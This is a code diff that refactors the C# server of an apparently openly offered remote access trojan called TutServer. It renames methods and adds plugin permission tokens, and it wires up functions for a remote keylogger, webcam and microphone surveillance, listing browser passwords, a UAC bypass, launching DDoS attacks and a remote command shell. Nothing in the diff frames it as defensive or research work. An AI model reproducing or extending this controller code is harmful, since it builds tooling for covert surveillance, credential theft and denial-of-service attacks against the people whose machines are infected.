@@ -13,6 +13,8 @@ using sCore; //For plugin interaction
 using sCore.IO; //For binding plugin functions
 using System.Threading.Tasks; //For Tasks (they are similar to threads)
 
+#pragma warning disable IDE1006
+
 namespace TutServer //Main Namespace
 {
     public partial class Form1 : Form //Our form
@@ -65,15 +67,16 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Array of controlled clients
         /// </summary>
-        private int[] controlClients = { 0 };
+        private int controlClient = 0;
         /// <summary>
         /// Indicates if the remote cmd is active
         /// </summary>
         private static bool _isCmdStarted = false;
+        private static string hostToken = "";
         /// <summary>
         /// Distributes remote cmd data to plugins
         /// </summary>
-        public static bool IsCmdStarted { get { return _isCmdStarted; } set { _isCmdStarted = value; sCore.RAT.Cmd.IsCmdOnline = value; } }
+        public static bool IsCmdStarted { get { return _isCmdStarted; } set { _isCmdStarted = value; sCore.RAT.Cmd.SetCmdOnline(hostToken, value); } }
         /// <summary>
         /// Current path for the file browser module
         /// </summary>
@@ -81,7 +84,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Distributes the current path to plugins
         /// </summary>
-        private String Current_Path { get { return _currentPath; } set { _currentPath = value; sCore.RAT.FileSystem.CurrentDirectory = value; } }
+        private String Current_Path { get { return _currentPath; } set { _currentPath = value; sCore.RAT.FileSystem.SetCurrentDirectory(hostToken, value); } }
         /// <summary>
         /// File transfer from location
         /// </summary>
@@ -129,7 +132,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Distributes server start info to plugins
         /// </summary>
-        private bool IsStartedServer { get { return _isServerStarted; } set { sCore.RAT.ServerSettings.serverState = value; _isServerStarted = value; } }
+        private bool IsStartedServer { get { return _isServerStarted; } set { sCore.RAT.ServerSettings.SetServerState(hostToken, value); _isServerStarted = value; } }
         /// <summary>
         /// Indicates if clients need to get new IDs
         /// </summary>
@@ -153,7 +156,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Distributes if surveillance is active to plugins
         /// </summary>
-        private bool MultiRecv { get { return _multiRecv; } set { _multiRecv = value; sCore.RAT.ServerSettings.multiRecv = value; } }
+        private bool MultiRecv { get { return _multiRecv; } set { _multiRecv = value; sCore.RAT.ServerSettings.SetMultiRecv(hostToken, value); } }
         /// <summary>
         /// Indicates if remote desktop watcher is active
         /// </summary>
@@ -161,7 +164,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Distributes to plugins if remote desktop is active
         /// </summary>
-        private bool RDesktop { get { return _rdesktop; } set { _rdesktop = value; sCore.RAT.RemoteDesktop.isRemoteDesktop = value; } }
+        private bool RDesktop { get { return _rdesktop; } set { _rdesktop = value; sCore.RAT.RemoteDesktop.SetIsRemoteDesktop(hostToken, value); } }
 
         //public static double dx = 0;
         //public static double dy = 0;
@@ -200,7 +203,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Distributes remote desktop full screen status to plugins
         /// </summary>
-        public static bool IsRdFull { get { return _isrdFull; } set { _isrdFull = value; sCore.RAT.RemoteDesktop.isFullScreen = value; } }
+        public static bool IsRdFull { get { return _isrdFull; } set { _isrdFull = value; sCore.RAT.RemoteDesktop.SetIsFullScreen(hostToken, value); } }
         /// <summary>
         /// Reference to the remote desktop object
         /// </summary>
@@ -270,11 +273,11 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Distributes if remote audio stream is active to plugins
         /// </summary>
-        private bool AuStream { get { return _austream; } set { _austream = value; sCore.RAT.AudioListener.IsAudioStream = value; } }
+        private bool AuStream { get { return _austream; } set { _austream = value; sCore.RAT.AudioListener.SetAudioStream(hostToken, value); } }
         /// <summary>
         /// Audio Stream playback object
         /// </summary>
-        private audioStream astream = new audioStream();
+        private AudioStream astream = new AudioStream();
         /// <summary>
         /// Indicates if webcam stream is active
         /// </summary>
@@ -282,15 +285,11 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// Distributes if remote webcam stream is active to plugins
         /// </summary>
-        private bool WStream { get { return _wStream; } set { _wStream = value; sCore.RAT.RemoteCamera.IsCameraStream = value; } }
+        private bool WStream { get { return _wStream; } set { _wStream = value; sCore.RAT.RemoteCamera.SetCameraStream(hostToken, value); } }
         /// <summary>
         /// Startup folder of the client
         /// </summary>
         public String remStart = "";
-        /// <summary>
-        /// The upload finished flag
-        /// </summary>
-        private bool uploadFinished = false;
         /// <summary>
         /// Remote mouse movement commands
         /// </summary>
@@ -306,7 +305,7 @@ namespace TutServer //Main Namespace
         /// <summary>
         /// List of remote pipes
         /// </summary>
-        List<remotePipe> rPipeList = new List<remotePipe>();
+        List<RemotePipe> rPipeList = new List<RemotePipe>();
         /// <summary>
         /// Plugin host object
         /// </summary>
@@ -324,6 +323,14 @@ namespace TutServer //Main Namespace
         /// Mouse movement control flag
         /// </summary>
         private bool mouseMovement = true; //switch
+        /// <summary>
+        /// Plugin local function bridge instance
+        /// </summary>
+        private ScriptHost.LocalBridgeFunctions lbf;
+        /// <summary>
+        /// ToolStrip item add/remove locking object
+        /// </summary>
+        private object TSLockObject = new object();
 
         #endregion
 
@@ -389,7 +396,7 @@ namespace TutServer //Main Namespace
             public bool IsLinuxClient(Socket s)
             {
                 bool result = false; //Declare result
-                int socketID = ctx.getSocket(s); //Get the index of the socket
+                int socketID = ctx.GetSocket(s); //Get the index of the socket
                 result = IsLinuxClient(socketID); //Check if socket is added to the manager
                 return result; //return the result
             }
@@ -469,7 +476,7 @@ namespace TutServer //Main Namespace
 
                     for (int i = 0; i < vProcName.Count; i++) //Go thorugh all the processes
                     {
-                        ctx.setprocInfoCallback(vProcName[i], responsive, noData, noData, noData, vProcId[i]); //Add them to the listView
+                        ctx.SetprocInfoCallback(vProcName[i], responsive, noData, noData, noData, vProcId[i]); //Add them to the listView
                     }
 
                     vProcName.Clear(); //Release the process name list
@@ -479,7 +486,7 @@ namespace TutServer //Main Namespace
                 if (command.StartsWith("cmdout|")) //Treminal output received
                 {
                     String toAppend = command.Substring(7); //Remove the command header
-                    ctx.append(toAppend); //Append the command to the terminal window
+                    ctx.Append(toAppend); //Append the command to the terminal window
                 }
             }
 
@@ -496,7 +503,7 @@ namespace TutServer //Main Namespace
                 {
                     text = text.Substring(4); //Remove the command header
                     text = "cmd|" + text; //Create a new command
-                    ctx.append("user@remoteShell: " + text.Replace("cmd|", String.Empty) + Environment.NewLine); //Append the command to the shell window
+                    ctx.Append("user@remoteShell: " + text.Replace("cmd|", String.Empty) + Environment.NewLine); //Append the command to the shell window
                 }
                 byte[] buffer = Encoding.ASCII.GetBytes(text); //Create the text buffer
                 Socket s = ctx.GetSocketById(target); //Get the target socket
@@ -509,11 +516,75 @@ namespace TutServer //Main Namespace
         /// </summary>
         public class ScriptHost
         {
+            public class LocalBridgeFunctions : BridgeFunctions
+            {
+                public override MessageBoxDelegate ShowMessageBox { get; set; }
+                public override VoidDelegate StartServer { get; set; }
+                public override VoidDelegate StopServer { get; set; }
+                public override VoidDelegate ToggleServer { get; set; }
+                public override RemoteMessageDelegate ShowRemoteMessageBox { get; set; }
+                public override StringDelegate PlayFrequency { get; set; }
+                public override SystemSoundDelegate PlaySystemSound { get; set; }
+                public override StringDelegate T2s { get; set; }
+                public override SystemElementDelegate SwitchElementVisibility { get; set; }
+                public override CdTrayDelegate CdTrayManipulation { get; set; }
+                public override VoidDelegate ListProcesses { get; set; }
+                public override StringDelegate KillProcess { get; set; }
+                public override StartProcessDelegate StartProcess { get; set; }
+                public override VoidDelegate StartCmd { get; set; }
+                public override VoidDelegate StopCmd { get; set; }
+                public override VoidDelegate ToggleCmd { get; set; }
+                public override StringDelegate SendCmdCommand { get; set; }
+                public override StringReturnDelegate ReadCmdOutput { get; set; }
+                public override VoidDelegate ListDrives { get; set; }
+                public override StringDelegate ChangeDircectory { get; set; }
+                public override VoidDelegate Up1Dir { get; set; }
+                public override StringDelegate CopyFile { get; set; }
+                public override StringDelegate MoveFile { get; set; }
+                public override StringDelegate PasteFile { get; set; }
+                public override StringDelegate ExecuteFile { get; set; }
+                public override String2Delegate UploadFile { get; set; }
+                public override String2Delegate DownloadFile { get; set; }
+                public override StringDelegate OpenFileEditor { get; set; }
+                public override ChangeAttrDelegate ChangeFileAttribute { get; set; }
+                public override StringDelegate DeleteFile { get; set; }
+                public override String2Delegate RenameFile { get; set; }
+                public override String2Delegate CreateFolder { get; set; }
+                public override String2Delegate CreateFile { get; set; }
+                public override VoidDelegate StartKeylogger { get; set; }
+                public override VoidDelegate StopKeylogger { get; set; }
+                public override VoidDelegate ReadKeylog { get; set; }
+                public override VoidDelegate ClearKeylog { get; set; }
+                public override VoidDelegate StartRemoteDesktop { get; set; }
+                public override VoidDelegate StopRemoteDesktop { get; set; }
+                public override BoolDelegate ControlRemoteMouse { get; set; }
+                public override BoolDelegate ControlRemoteKeyboard { get; set; }
+                public override VoidDelegate StartFullScreen { get; set; }
+                public override IntDelegate StartAudio { get; set; }
+                public override VoidDelegate StopAudio { get; set; }
+                public override VoidDelegate ListAudio { get; set; }
+                public override IntDelegate StartVideo { get; set; }
+                public override VoidDelegate ListVideo { get; set; }
+                public override VoidDelegate StopVideo { get; set; }
+                public override DDoSTestDelegate ValidateDDoS { get; set; }
+                public override VoidDelegate StopDDoS { get; set; }
+                public override DDoSDelegate StartDDoS { get; set; }
+                public override VoidDelegate ClearList { get; set; }
+                public override VoidDelegate ListPassword { get; set; }
+                public override VoidDelegate BypassUAC { get; set; }
+                public override VoidDelegate StartProxy { get; set; }
+                public override StringDelegate SaveFile { get; set; }
+                public override StringDelegate SendRawCommand { get; set; }
+                public override InputDelegate ShowInputBox { get; set; }
+            }
+
             /// <summary>
             /// The directory of the plugins
             /// </summary>
             string dir = "";
-            private Dictionary<string, string> _globalEnum = new Dictionary<string, string>();
+            /// <summary>
+            /// List of assemblies for plugin files
+            /// </summary>
             private Dictionary<string, Assembly> scriptDlls = new Dictionary<string, Assembly>();
             /// <summary>
             /// List of the running plugins
@@ -527,6 +598,10 @@ namespace TutServer //Main Namespace
             /// Reference to the main form
             /// </summary>
             Form1 ctx;
+            /// <summary>
+            /// Master key for revoking permissions (plugins cannot have this)
+            /// </summary>
+            private string masterKey;
 
             /// <summary>
             /// Constructor
@@ -537,6 +612,7 @@ namespace TutServer //Main Namespace
             {
                 dir = rootDir; //Set the root directory
                 ctx = parent; //Set the reference to the form
+                masterKey = sCore.Integration.Integrate.GetMasterKey();
             }
 
             /// <summary>
@@ -573,12 +649,7 @@ namespace TutServer //Main Namespace
                 if (!ifaceList.ContainsKey(dllName)) return; //Check if the plugin is loaded
                 IPluginMain iface = ifaceList[dllName]; //Retrieve the plugin main
                 iface.Main(); //Call the plugins main method
-            }
-
-            private void InvokeDllThread(object obj)
-            {
-                IPluginMain ipm = (IPluginMain)obj;
-                ipm.Main();
+                if (!runningPlugins.Contains(iface))runningPlugins.Add(iface);
             }
 
             /// <summary>
@@ -630,67 +701,84 @@ namespace TutServer //Main Namespace
             /// </summary>
             public void SetupBridge()
             {
-                BridgeFunctions.ShowMessageBox = new MessageBoxDelegate(ctx.XMessageBox); //Local messagebox display
-                BridgeFunctions.StartServer = new VoidDelegate(ctx.XStartServer); //Local server start
-                BridgeFunctions.StopServer = new VoidDelegate(ctx.XStopServer); //Local server stop
-                BridgeFunctions.ToggleServer = new VoidDelegate(ctx.XToggleServer); //Local server toggle (start/stop)
-                BridgeFunctions.ShowRemoteMessageBox = new RemoteMessageDelegate(ctx.XRemoteMessage); //Remote messagebox display
-                BridgeFunctions.PlayFrequency = new StringDelegate(ctx.XFrequency); //Remote frequency player
-                BridgeFunctions.PlaySystemSound = new SystemSoundDelegate(ctx.XSystemSound); //Remote system sound player
-                BridgeFunctions.T2s = new StringDelegate(ctx.XT2s); //Remote Text To Speech generator
-                BridgeFunctions.SwitchElementVisibility = new SystemElementDelegate(ctx.XElements); //Remote element hide/show
-                BridgeFunctions.CdTrayManipulation = new CdTrayDelegate(ctx.XCdTray); //Remote CD Tray control
-                BridgeFunctions.ListProcesses = new VoidDelegate(ctx.XListProcesses); //List remote processes
-                BridgeFunctions.KillProcess = new StringDelegate(ctx.XKillProcess); //Kill remote processes
-                BridgeFunctions.StartProcess = new StartProcessDelegate(ctx.XStartProcess); //Start remote processes
-                BridgeFunctions.StartCmd = new VoidDelegate(ctx.XStartCmd); //Start new remote cmd session
-                BridgeFunctions.StopCmd = new VoidDelegate(ctx.XStopCmd); //Stop remote cmd session
-                BridgeFunctions.ToggleCmd = new VoidDelegate(ctx.XToggleCmd); //Toggle remote cmd session (start/stop)
-                BridgeFunctions.SendCmdCommand = new StringDelegate(ctx.XSendCmdCommand); //Send commands to remote cmd
-                BridgeFunctions.ReadCmdOutput = new StringReturnDelegate(ctx.XReadCmdOutput); //Read the output of remote cmd
-                BridgeFunctions.ListDrives = new VoidDelegate(ctx.XListDrives); //List the remote drives
-                BridgeFunctions.ChangeDircectory = new StringDelegate(ctx.XChangeFolder); //Change the current folder
-                BridgeFunctions.Up1Dir = new VoidDelegate(ctx.XUp1); //Naviagte UP1 folder
-                BridgeFunctions.CopyFile = new StringDelegate(ctx.XCopyFile); //Remote file copy
-                BridgeFunctions.MoveFile = new StringDelegate(ctx.XMoveFile); //Remote file move
-                BridgeFunctions.PasteFile = new StringDelegate(ctx.XPasteFile); //Remote file paste
-                BridgeFunctions.ExecuteFile = new StringDelegate(ctx.XExecuteFile); //Remote file execution
-                BridgeFunctions.UploadFile = new String2Delegate(ctx.XUploadFile); //Remote file upload
-                BridgeFunctions.DownloadFile = new String2Delegate(ctx.XDownloadFile); //Remote file download
-                BridgeFunctions.OpenFileEditor = new StringDelegate(ctx.XOpenFileEditor); //Open remote file editor
-                BridgeFunctions.ChangeFileAttribute = new ChangeAttrDelegate(ctx.XChangeAttribute); //Remote change file attributes
-                BridgeFunctions.DeleteFile = new StringDelegate(ctx.XDeleteFile); //Remote delete file
-                BridgeFunctions.RenameFile = new String2Delegate(ctx.XRenameFile); //Rename remote file
-                BridgeFunctions.CreateFile = new String2Delegate(ctx.XNewFile); //Create new remote file
-                BridgeFunctions.CreateFolder = new String2Delegate(ctx.XNewDirectory); //Create new remote directory
-                BridgeFunctions.StartKeylogger = new VoidDelegate(ctx.XStartKeylogger); //Start remote keylogger
-                BridgeFunctions.StopKeylogger = new VoidDelegate(ctx.XStopKeylogger); //Stop remote keylogger
-                BridgeFunctions.ReadKeylog = new VoidDelegate(ctx.XReadKeylog); //Read the remote keylog
-                BridgeFunctions.ClearKeylog = new VoidDelegate(ctx.XClearKeylog); //Clear the remote keylog
-                BridgeFunctions.StartRemoteDesktop = new VoidDelegate(ctx.XStartRemoteDesktop); //Start remote desktop view
-                BridgeFunctions.StopRemoteDesktop = new VoidDelegate(ctx.XStopRemoteDesktop); //Stop remote desktop view
-                BridgeFunctions.StartFullScreen = new VoidDelegate(ctx.XLaunchFullScreen); //Full screen mode remote desktop view
-                BridgeFunctions.ControlRemoteKeyboard = new BoolDelegate(ctx.XControlRemoteKeyboard); //Enable, Disable remote mouse control
-                BridgeFunctions.ControlRemoteMouse = new BoolDelegate(ctx.XControlRemoteMouse); //Enable, Disable remote keyboard control
-                BridgeFunctions.StartAudio = new IntDelegate(ctx.XStartAudio); //Start remote audio stream
-                BridgeFunctions.StopAudio = new VoidDelegate(ctx.XStopAudio); //Stop remote audio stream
-                BridgeFunctions.ListAudio = new VoidDelegate(ctx.XListAudio); //List remote audio listener devices
-                BridgeFunctions.StartVideo = new IntDelegate(ctx.XStartVideo); //Start remote video stream
-                BridgeFunctions.StopVideo = new VoidDelegate(ctx.XStopVideo); //Stop remote video stream
-                BridgeFunctions.ListVideo = new VoidDelegate(ctx.XListVideo); //List remote video devices
-                BridgeFunctions.StartDDoS = new DDoSDelegate(ctx.XStartDDoS); //Start a remote DDoS attack
-                BridgeFunctions.StopDDoS = new VoidDelegate(ctx.XStopDDoS); //Stop the remote DDoS attack
-                BridgeFunctions.ValidateDDoS = new DDoSTestDelegate(ctx.XValidateDDoS); //Validate a DDoS attack
-                BridgeFunctions.ListPassword = new VoidDelegate(ctx.XListPassword); //List remote browser passwords
-                BridgeFunctions.ClearList = new VoidDelegate(ctx.XClearList); //Clear the password list
-                BridgeFunctions.BypassUAC = new VoidDelegate(ctx.XBypassUAC); //Try to bypass the UAC
-                BridgeFunctions.StartProxy = new VoidDelegate(ctx.XLaunchProxy); //Start remote proxy server
-                BridgeFunctions.SaveFile = new StringDelegate(ctx.XSaveEditorFile); //Save remote file editor
-                BridgeFunctions.ShowInputBox = new InputDelegate(ctx.XInputBox); //Local show input box
+                LocalBridgeFunctions lf = new LocalBridgeFunctions
+                {
+                    ShowMessageBox = new MessageBoxDelegate(ctx.XMessageBox), //Local messagebox display
+                    StartServer = new VoidDelegate(ctx.XStartServer), //Local server start
+                    StopServer = new VoidDelegate(ctx.XStopServer), //Local server stop
+                    ToggleServer = new VoidDelegate(ctx.XToggleServer), //Local server toggle (start/stop)
+                    ShowRemoteMessageBox = new RemoteMessageDelegate(ctx.XRemoteMessage), //Remote messagebox display
+                    PlayFrequency = new StringDelegate(ctx.XFrequency), //Remote frequency player
+                    PlaySystemSound = new SystemSoundDelegate(ctx.XSystemSound), //Remote system sound player
+                    T2s = new StringDelegate(ctx.XT2s), //Remote Text To Speech generator
+                    SwitchElementVisibility = new SystemElementDelegate(ctx.XElements), //Remote element hide/show
+                    CdTrayManipulation = new CdTrayDelegate(ctx.XCdTray), //Remote CD Tray control
+                    ListProcesses = new VoidDelegate(ctx.XListProcesses), //List remote processes
+                    KillProcess = new StringDelegate(ctx.XKillProcess), //Kill remote processes
+                    StartProcess = new StartProcessDelegate(ctx.XStartProcess), //Start remote processes
+                    StartCmd = new VoidDelegate(ctx.XStartCmd), //Start new remote cmd session
+                    StopCmd = new VoidDelegate(ctx.XStopCmd), //Stop remote cmd session
+                    ToggleCmd = new VoidDelegate(ctx.XToggleCmd), //Toggle remote cmd session (start/stop)
+                    SendCmdCommand = new StringDelegate(ctx.XSendCmdCommand), //Send commands to remote cmd
+                    ReadCmdOutput = new StringReturnDelegate(ctx.XReadCmdOutput), //Read the output of remote cmd
+                    ListDrives = new VoidDelegate(ctx.XListDrives), //List the remote drives
+                    ChangeDircectory = new StringDelegate(ctx.XChangeFolder), //Change the current folder
+                    Up1Dir = new VoidDelegate(ctx.XUp1), //Naviagte UP1 folder
+                    CopyFile = new StringDelegate(ctx.XCopyFile), //Remote file copy
+                    MoveFile = new StringDelegate(ctx.XMoveFile), //Remote file move
+                    PasteFile = new StringDelegate(ctx.XPasteFile), //Remote file paste
+                    ExecuteFile = new StringDelegate(ctx.XExecuteFile), //Remote file execution
+                    UploadFile = new String2Delegate(ctx.XUploadFile), //Remote file upload
+                    DownloadFile = new String2Delegate(ctx.XDownloadFile), //Remote file download
+                    OpenFileEditor = new StringDelegate(ctx.XOpenFileEditor), //Open remote file editor
+                    ChangeFileAttribute = new ChangeAttrDelegate(ctx.XChangeAttribute), //Remote change file attributes
+                    DeleteFile = new StringDelegate(ctx.XDeleteFile), //Remote delete file
+                    RenameFile = new String2Delegate(ctx.XRenameFile), //Rename remote file
+                    CreateFile = new String2Delegate(ctx.XNewFile), //Create new remote file
+                    CreateFolder = new String2Delegate(ctx.XNewDirectory), //Create new remote directory
+                    StartKeylogger = new VoidDelegate(ctx.XStartKeylogger), //Start remote keylogger
+                    StopKeylogger = new VoidDelegate(ctx.XStopKeylogger), //Stop remote keylogger
+                    ReadKeylog = new VoidDelegate(ctx.XReadKeylog), //Read the remote keylog
+                    ClearKeylog = new VoidDelegate(ctx.XClearKeylog), //Clear the remote keylog
+                    StartRemoteDesktop = new VoidDelegate(ctx.XStartRemoteDesktop), //Start remote desktop view
+                    StopRemoteDesktop = new VoidDelegate(ctx.XStopRemoteDesktop), //Stop remote desktop view
+                    StartFullScreen = new VoidDelegate(ctx.XLaunchFullScreen), //Full screen mode remote desktop view
+                    ControlRemoteKeyboard = new BoolDelegate(ctx.XControlRemoteKeyboard), //Enable, Disable remote mouse control
+                    ControlRemoteMouse = new BoolDelegate(ctx.XControlRemoteMouse), //Enable, Disable remote keyboard control
+                    StartAudio = new IntDelegate(ctx.XStartAudio), //Start remote audio stream
+                    StopAudio = new VoidDelegate(ctx.XStopAudio), //Stop remote audio stream
+                    ListAudio = new VoidDelegate(ctx.XListAudio), //List remote audio listener devices
+                    StartVideo = new IntDelegate(ctx.XStartVideo), //Start remote video stream
+                    StopVideo = new VoidDelegate(ctx.XStopVideo), //Stop remote video stream
+                    ListVideo = new VoidDelegate(ctx.XListVideo), //List remote video devices
+                    StartDDoS = new DDoSDelegate(ctx.XStartDDoS), //Start a remote DDoS attack
+                    StopDDoS = new VoidDelegate(ctx.XStopDDoS), //Stop the remote DDoS attack
+                    ValidateDDoS = new DDoSTestDelegate(ctx.XValidateDDoS), //Validate a DDoS attack
+                    ListPassword = new VoidDelegate(ctx.XListPassword), //List remote browser passwords
+                    ClearList = new VoidDelegate(ctx.XClearList), //Clear the password list
+                    BypassUAC = new VoidDelegate(ctx.XBypassUAC), //Try to bypass the UAC
+                    StartProxy = new VoidDelegate(ctx.XLaunchProxy), //Start remote proxy server
+                    SaveFile = new StringDelegate(ctx.XSaveEditorFile), //Save remote file editor
+                    ShowInputBox = new InputDelegate(ctx.XInputBox) //Local show input box
+                };
                 sCore.UI.CommonControls.fileManagerMenu = ctx.contextMenuStrip3; //Share the file manager's context menu with the plugin
                 sCore.UI.CommonControls.processMenu = ctx.contextMenuStrip2; //Share the process manager's context menu with the plugin
                 sCore.UI.CommonControls.mainTabControl = ctx.tabControl1; //Share the tabControl with the plugin
-                sCore.UI.ControlManager.FormControls = ctx.Controls; //Share every control with the plugin
+                sCore.UI.ControlManager.SetFormControls(ctx.Controls); //Share every control with the plugin
+
+                ctx.lbf = lf;
+                sCore.Integration.Integrate.SetBridge(ctx.lbf);
+            }
+
+            /// <summary>
+            /// Send stopping singal to a plugin
+            /// </summary>
+            /// <param name="iface">The plugin's interface to kill</param>
+            public void StopSignalPlugin(IPluginMain iface)
+            {
+                iface.OnExit(); //Signal the stop to the plugin
+                runningPlugins.Remove(iface); //Remove from the running plugins list
+                sCore.Integration.Integrate.RevokePermissions(masterKey, iface); //Revoke the plugin's permissions
             }
         }
 
@@ -708,7 +796,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                return (Types.InputBoxValue) Invoke(BridgeFunctions.ShowInputBox, new object[] { title, message }); //Invoke and return result
+                return (Types.InputBoxValue) Invoke(lbf.ShowInputBox, new object[] { title, message }); //Invoke and return result
             }
 
             string value = ""; //Declare result
@@ -728,7 +816,7 @@ namespace TutServer //Main Namespace
         /// <param name="content">The contents of the file to write</param>
         public void XSaveEditorFile(string content)
         {
-            saveFile(content); //Save remote file
+            SaveFile(content); //Save remote file
         }
 
         /// <summary>
@@ -738,7 +826,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                Invoke(BridgeFunctions.StartProxy); //Invoke
+                Invoke(lbf.StartProxy); //Invoke
                 return; //Return
             }
 
@@ -750,7 +838,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XBypassUAC()
         {
-            loopSend("uacbypass"); //Send UAC bypass command
+            SendToTarget("uacbypass"); //Send UAC bypass command
         }
 
         /// <summary>
@@ -758,7 +846,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XListPassword()
         {
-            loopSend("getpw"); //Send command to list passwords
+            SendToTarget("getpw"); //Send command to list passwords
         }
 
         /// <summary>
@@ -768,7 +856,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                Invoke(BridgeFunctions.ClearList); //Invoke
+                Invoke(lbf.ClearList); //Invoke
                 return; //Return
             }
 
@@ -793,7 +881,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                Invoke(BridgeFunctions.StopDDoS); //Invoke
+                Invoke(lbf.StopDDoS); //Invoke
                 return; //Return
             }
 
@@ -808,7 +896,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                Invoke(BridgeFunctions.ValidateDDoS); //Invoke
+                Invoke(lbf.ValidateDDoS); //Invoke
                 return; //Return
             }
 
@@ -823,7 +911,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                Invoke(BridgeFunctions.StartVideo); //Invoke
+                Invoke(lbf.StartVideo); //Invoke
                 return; //Return
             }
 
@@ -834,7 +922,7 @@ namespace TutServer //Main Namespace
                 MultiRecv = true; //Set multi recv since this is a surveillance module
                 WStream = true; //Set the wStream to started
                 button27.Text = "Stop stream"; //Update button text
-                loopSend(command); //Send the command to the client
+                SendToTarget(command); //Send the command to the client
             }
         }
 
@@ -845,13 +933,13 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                Invoke(BridgeFunctions.StopVideo); //Invoke
+                Invoke(lbf.StopVideo); //Invoke
                 return; //Return
             }
 
             if (WStream) //Check if video stream is running
             {
-                loopSend("wstop"); //Send the command to stop
+                SendToTarget("wstop"); //Send the command to stop
 
                 if (!RDesktop && !AuStream) //If no remote desktop and no audio stream is running
                 {
@@ -869,7 +957,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XListVideo()
         {
-            loopSend("wlist"); //Send the listing command
+            SendToTarget("wlist"); //Send the listing command
         }
 
         /// <summary>
@@ -880,7 +968,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check if we need to invoke
             {
-                Invoke(BridgeFunctions.StartAudio); //Invoke
+                Invoke(lbf.StartAudio); //Invoke
                 return; //Return
             }
 
@@ -888,9 +976,9 @@ namespace TutServer //Main Namespace
             {
                 MultiRecv = true; //Set multiRecv, since it's a surveillance module
                 AuStream = true; //Enable audio straming mode
-                astream = new audioStream(); //Create a new playback object
-                astream.init(); //Init the playback
-                loopSend("astream§" + deviceNumber.ToString()); //Send command to start streaming
+                astream = new AudioStream(); //Create a new playback object
+                astream.Init(); //Init the playback
+                SendToTarget("astream§" + deviceNumber.ToString()); //Send command to start streaming
                 button25.Text = "Stop Stream"; //Update the button text
             }
         }
@@ -902,13 +990,13 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //Check fi we need to invoke
             {
-                Invoke(BridgeFunctions.StopAudio); //Invoke
+                Invoke(lbf.StopAudio); //Invoke
                 return; //Return
             }
 
             if (AuStream) //Check if audio stream is running
             {
-                loopSend("astop"); //Stop the client stream
+                SendToTarget("astop"); //Stop the client stream
                 if (!RDesktop && !WStream) //If not remote desktop and no video stream is running
                 {
                     Application.DoEvents(); //Do the events
@@ -916,7 +1004,7 @@ namespace TutServer //Main Namespace
                     MultiRecv = false; //Set multiRecv to false, since no surveillance module is running
                 }
                 AuStream = false; //Disable audio streaming
-                astream.destroy(); //Release the playback object
+                astream.Destroy(); //Release the playback object
                 astream = null; //Set the playback reference to null
                 button25.Text = "Start Stream"; //Update the button text
             }
@@ -927,7 +1015,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XListAudio()
         {
-            loopSend("alist"); //Send listing command
+            SendToTarget("alist"); //Send listing command
         }
 
         /// <summary>
@@ -948,7 +1036,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.StopRemoteDesktop); //Invoke
+                Invoke(lbf.StopRemoteDesktop); //Invoke
                 return; //Return
             }
 
@@ -963,7 +1051,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.ControlRemoteMouse); //Invoke
+                Invoke(lbf.ControlRemoteMouse); //Invoke
                 return; //Return
             }
 
@@ -979,7 +1067,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.ControlRemoteKeyboard); //Invoke
+                Invoke(lbf.ControlRemoteKeyboard); //Invoke
                 return; //Return
             }
 
@@ -994,7 +1082,7 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.StartFullScreen); //Invoke
+                Invoke(lbf.StartFullScreen); //Invoke
                 return; //Return
             }
 
@@ -1006,7 +1094,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XStartKeylogger()
         {
-            loopSend("sklog"); //Send command to start keylogger
+            SendToTarget("sklog"); //Send command to start keylogger
         }
 
         /// <summary>
@@ -1014,7 +1102,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XStopKeylogger()
         {
-            loopSend("stklog"); //Send command to stop remote keylogger
+            SendToTarget("stklog"); //Send command to stop remote keylogger
         }
 
         /// <summary>
@@ -1022,7 +1110,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XReadKeylog()
         {
-            loopSend("rklog"); //Send command to read remote keylog
+            SendToTarget("rklog"); //Send command to read remote keylog
         }
 
         /// <summary>
@@ -1030,7 +1118,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XClearKeylog()
         {
-            loopSend("cklog"); //Send command to clear remtote keylog buffer
+            SendToTarget("cklog"); //Send command to clear remtote keylog buffer
         }
 
         /// <summary>
@@ -1038,7 +1126,7 @@ namespace TutServer //Main Namespace
         /// </summary>
         public void XListDrives()
         {
-            loopSend("fdrive"); //Send command to list remote drives
+            SendToTarget("fdrive"); //Send command to list remote drives
         }
 
         /// <summary>
@@ -1049,11 +1137,11 @@ namespace TutServer //Main Namespace
         {
             if (InvokeRequired) //If we need to invoke
             {
-                Invoke(BridgeFunctions.ChangeDircectory, new object[] { folderName }); //Invoke
+                Invoke(lbf.ChangeDircectory, new object[] { folderName }); //Invoke
